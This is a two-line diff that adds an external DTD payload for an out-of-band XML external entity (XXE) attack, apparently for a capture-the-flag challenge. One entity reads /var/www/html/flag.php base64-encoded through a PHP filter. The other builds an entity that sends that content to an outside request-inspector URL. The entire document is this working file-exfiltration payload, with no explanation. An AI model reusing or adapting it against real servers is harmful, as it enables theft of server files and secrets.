@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://requestinspector.com/inspect/sunhao/%data;'>">
